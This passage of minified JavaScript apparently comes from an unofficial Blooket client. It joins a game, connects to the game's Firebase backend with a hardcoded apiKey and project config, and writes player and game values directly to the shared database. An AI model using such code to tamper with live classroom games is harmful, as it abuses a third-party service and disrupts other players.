    function E(e, t) {
        var n = document.createElement("div");
        n.className = "inputcontainer";
        var o = document.createElement("div");
        o.innerText = e + ":", n.appendChild(o);
        var a = document.createElement("input");
        return a.addEventListener("keydown", (e => {
            13 == e.keyCode && t(a.value)
        })), n.appendChild(a), n.addEventListener("click", (function(e) {
            e.target !== a && t(a.value)
        })), n
    }

    function P(e, t, n) {
        var o = document.createElement("div");
        o.className = "inputcontainer";
        var a = document.createElement("div");
        a.innerText = e + ":", o.appendChild(a);
        var r = document.createElement("select");
        return r.innerHTML = "<option>Click to update</option>", r.addEventListener("click", (function(e) {
            var n = t(r);
            n && (r.innerHTML = "", n.sort().forEach((e => {
                var t = document.createElement("option");
                t.innerText = e, r.appendChild(t)
            })))
        })), o.appendChild(r), o.addEventListener("click", (function(e) {
            e.target !== r && n(r.value)
        })), o
    }

    function $(e, t, n) {
        var o = document.createElement("div");
        o.className = "inputcontainer";
        var a = document.createElement("div");
        a.innerText = e + ":", o.appendChild(a);
        var r = document.createElement("select");
        return t.sort().forEach((e => {
            var t = document.createElement("option");
            t.innerText = e, r.appendChild(t)
        })), o.appendChild(r), o.addEventListener("click", (function(e) {
            e.target !== r && n(r.value)
        })), o
    }
    document.querySelector("#gcode").addEventListener("keydown", (e => {
        13 == e.keyCode && join()
    })), document.querySelector("#gname").addEventListener("keydown", (e => {
        13 == e.keyCode && join()
    }));
    var O = !1,
        D = {
            x: 0,
            y: 0
        };

    function G(e) {
        var t = document.createElement("div");
        t.className = "chatmsg", t.innerText = e.replaceAll("", ""), document.querySelector(".chatcontainer").insertBefore(t, document.querySelector(".chatcontainer > div"))
    }
    async function L(t, a, l, f = !1) {
        d.connected = !1, d.connecting = !0, d.name = a, d.gid = t, T("Fetching token...");
        const p = f || await fetch("c/firebase/join", {
            body: JSON.stringify({
                id: t,
                name: a
            }),
            headers: {
                "Content-Type": "application/json"
            },
            method: "PUT"
        }).then((e => e.json()));
        if (T("Connecting to game..."), p.success) {
            const f = e({
                    apiKey: "AIzaSyCA-cTOnX19f6LFnDVVsHXya3k6ByP_MnU",
                    authDomain: "blooket-2020.firebaseapp.com",
                    projectId: "blooket-2020",
                    storageBucket: "blooket-2020.appspot.com",
                    messagingSenderId: "741533559105",
                    appId: "1:741533559105:web:b8cbb10e6123f2913519c0",
                    measurementId: "G-S3H5NGN10Z",
                    databaseURL: p.fbShardURL
                }, Date.now().toString()),
                m = n(f);
            await o(m, p.fbToken);
            const h = r(f);
            await c(i(h, `${t}/c/${a}`), {
                b: l ? u[Math.floor(Math.random() * u.length)] : "Rainbow Astronaut",
                rt: !0
            }), d.fbdb = h, d.liveApp = f, d.connecting = !1, d.connected = !0, T("Connected to game"), s(i(h, `${t}`), (e => {
                d.connected && k(e.val())
            })), s(i(h, `${t}/bu`), (e => {
                d.connected && z(e.val())
            }))
        } else T("Ready"), d.connecting = !1, errorBar("Connect error: " + p.msg)
    }
    async function H(e, t) {
        d.connected ? d.fbdb ? await c(i(d.fbdb, e), t) : errorBar("Cannot set value when there is no game!") : errorBar("Cannot set value while disconnected!")
    }
    async function M(e, t) {
        console.log(e, t), await H(`/${d.gid}/c/${d.name}/${e}`, t)
    }
    document.querySelector("#drag").addEventListener("mousedown", (e => {
        O = !0
    })), document.body.addEventListener("mousemove", (function(e) {
        O && (document.querySelector(".chat").style.left = parseInt(document.querySelector(".chat").style.left) + e.clientX - D.x + "px", document.querySelector(".chat").style.top = parseInt(document.querySelector(".chat").style.top) + e.clientY - D.y + "px"), D = {
            x: e.clientX,
            y: e.clientY
        }
    })), document.querySelector("#chat").addEventListener("keydown", (e => {
        if (13 == e.keyCode) {
            var t = document.querySelector("#chat").value;
            "/" == t[0] ? function(e) {
                switch (e.split("/")[1]) {
                    case "clear":
                        document.querySelector(".chatcontainer").innerHTML = '<div class="chatmsg"></div>';
                        break;
                    case "help":
                        G("Available Commands: /clear (clears chat window), /help (shows this menu)")
                }
            }(t) : function(e) {
                M("msg", {
                    msg: e,
                    i: b
                }), b++
            }(t), document.querySelector("#chat").value = ""
        }
    })), document.querySelector("#drag").addEventListener("mouseup", (e => {
        O = !1
    })), document.querySelectorAll("checkbox").forEach((e => {
        e.addEventListener("click", (function() {
            e.getAttribute("checked") ? e.removeAttribute("checked") : e.setAttribute("checked", "true")
        }))
    })), T("Ready")
};